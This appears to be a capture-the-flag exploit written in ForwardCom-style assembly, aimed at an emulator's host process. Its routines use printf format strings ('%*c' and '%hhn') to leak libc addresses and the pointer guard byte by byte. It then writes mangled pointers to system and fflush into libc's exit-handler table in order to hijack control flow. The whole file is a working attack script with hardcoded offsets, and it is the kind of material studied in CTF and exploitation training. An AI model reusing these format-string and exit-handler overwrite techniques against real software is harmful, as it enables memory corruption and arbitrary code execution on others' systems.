extern _printf: function

const section read ip // read-only data section
fmt_leak_str: int8 "%*c", 0
print_hex: int8 "||%#lx||\n ", 0
write_1_byte: int8 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%hhn",0
clear_byte: int8 "%hhn",0
newline: int8 "\n ",0
const end

bss section datap uninitialized // read-write data section
int64 parlist[5]
int8 libc_addr[8]
int8 tmp_mem[0x18]
int8 pointer_guard[9]
bss end

code section execute // executable code section

_leak function public
// r0: src (pointer to start of the leak)
// r1: dst (where to write the leaked bytes)
// r2: length of the leak (excluding the leading byte which will not be leaked)

// assumes that *(int8_t *)(src + length) >= 0
// for simplicity: length % 3 == 0, length >= 3

// interal register assignment
// r16: remaining length
// r17: current pointer to leak
// r18: current dst pointer
// r19: is negative mask

int64 r16 = r2
int64 r17 = r0 + r2 - 3
int64 r18 = r1 + r2 - 3
int64 r19 = 0

do {
    // leak bytes
    int64 r0 = address([fmt_leak_str])
    int64 r1 = r17
    call _printf

    // apply is_negative_mask: r0 = (r >> 24) >= 0 ? r0 : (-r0)
    // because we are lazy and don't want to use a conditional, we use the folliwng equivalent expression:
    // r0 = (r >> 24) >= 0 ? r0 : ((r0 ^ r19) - r19)
    int32 r0 = r0 ^ r19 // invert if negaitve
    int32 r0 = r0 - r19 // + 1 iff negative
    int32 r0 = r0 & 0xFFFFFF // we are only interested in the lower 3B

    // store leaked bytes
    int32 r1 = r0 & 0xFF
    int8 [r18] = r1
    int32 r1 = r0 >> 8
    int32 r1 = r1 & 0xFF
    int8 [r18 + 1] = r1
    int32 r1 = r0 >> 16
    int8 [r18 + 2] = r1

    // calculate is_negative_mask
    int32 r19 = r0 & 0x80
    int32 r19 = r19 << 24
    int32 r19 = shift_right_s(r19, 31)

    // move src and dst pointers to next location
    int64 r16 = r16 - 3
    int64 r17 = r17 - 3
    int64 r18 = r18 - 3
} while (int64 r16 > 0)

return
_leak end


_leak_efficient function public
// r0: src offset (guest addr)
// r1: src addr (host addr)
// r2: dst
// r3: length

// assumes src[length] to be writeable
// as well as *(int32_t *)(src + length - 1) small positive value, i.e. above src no large values (=> efficiency decreases) and no negative values (=> algorithm breaks)

// internal register alloacation:
// r16: cur src pointer
// r17: cur dst address
// r18: cur dst pointer
// r19: remaining length
// r20: saved length

int64 r16 = r0 + r3
int64 r17 = r1 + r3
int64 r18 = r2 + r3
int64 r19 = r3
int64 r20 = r3

do {
    int64 r16 = r16 - 1
    int64 r17 = r17 - 1
    int64 r18 = r18 - 1

    // leak byte
    int64 r1 = r16
    int64 r0 = address([fmt_leak_str])
    call _printf
    
    // store lekaed byte
    int64 r0 = r0 & 0xFF
    int8 [r18] = r0

    // prepare write zero
    int64 r1 = address([parlist])
    int64 [r1] = r17
    int64 r0 = address([clear_byte])
    call _printf

    int64 r19 = r19 - 1
} while(int64 r19 > 0) 

// write back value, leaked byte for byte
int64 r0 = r17
int64 r1 = r18
int64 r2 = r20
call _write

return
_leak_efficient end


_write function public
// r0: dst
// r1: src
// r2: length

// interal register assignemnt
// r16 = remaining length
// r17 = cur src pointer
// r18 = cur dst pointer

int64 r16 = r2 
int64 r17 = r1
int64 r18 = r0

do {
    // load src byte
    int64 r0 = 0
    int8 r2 = [r17]

    // put cur dst addr in parlist
    int64 r1 = address([parlist])
    int64 [r1] = r18

    // calculate format string
    int64 r0 = address([write_1_byte])
    int64 r0 = r0 - r2 + 256
    call _printf

    int64 r16 = r16 - 1
    int64 r17 = r17 + 1
    int64 r18 = r18 + 1
} while (int64 r16 >= 0)

return
_write end

_mangle_pointer function public
// r0: pointer
// pointer guard is loaded from [pointer_guard]
// guarantee: does not modify registers except r0

int64 r0 = r0 ^ [pointer_guard]
int64 r0 = rotate(r0, 17)
return
_mangle_pointer end


_main function public

// leak libc addr
int64 r0 = 0x31fc08
int64 r1 = address([libc_addr])
int64 [r1] = 0
int64 r2 = 6
call _leak

// print libc base addr for debug purposes
int64 r16 = [libc_addr]
int64 r16 = r16 - 0x3c8 // libc base
int64 [libc_addr] = r16
int64 r1 = address([parlist])
int64 [r1] = r16
int64 r0 = address([print_hex])
call _printf


// leak pointer guard
int64 r0 = 0x105ff0 - 0x4890 // pointer guard offset
int64 r1 = [libc_addr]
int64 r1 = r1 - 0x4890 // pointer guard addr
int64 r2 = address([pointer_guard])
int64 r3 = 9
call _leak_efficient

// print pointer guard to stdout for debug purposes
int64 r2 = [pointer_guard]
int64 r1 = address([parlist])
int64 [r1] = r2
int64 r0 = address([print_hex])
call _printf

// overwrite exit functions

int64 r24 = [libc_addr]
int64 r25 = r24 + 0x21bf00 // initial addr


// put system into initial->fns[0]
int64 r0 = r24 + 0x50d70 // system addr
call _mangle_pointer

int64 [tmp_mem + 8] = r0
int64 r0 = 3 // ef_at
int64 [tmp_mem] = r0
int64 r0 = r25 + 0x10
int64 r1 = address([tmp_mem])
int64 r2 = 16
call _write


// put fflush into initial->fns[1]
// also put stdout after it as argument
int64 r0 = r24 + 0x7f130 // fflush addr
call _mangle_pointer

int64 [tmp_mem + 8] = r0
int64 r0 = 4 // ef_cxa
int64 [tmp_mem] = r0
int64 r0 = r24 + 0x21b780 // stdout addr
int64 [tmp_mem + 16] = r0
int64 r0 = r25 + 0x30
int64 r1 = address([tmp_mem])
int64 r2 = 0x18
call _write


// print newline so that the flag is at the beginning of the line
int64 r0 = address([newline])
int64 r1 = address[parlist]
call _printf

int64 r0 = 0
return

_main end
code end
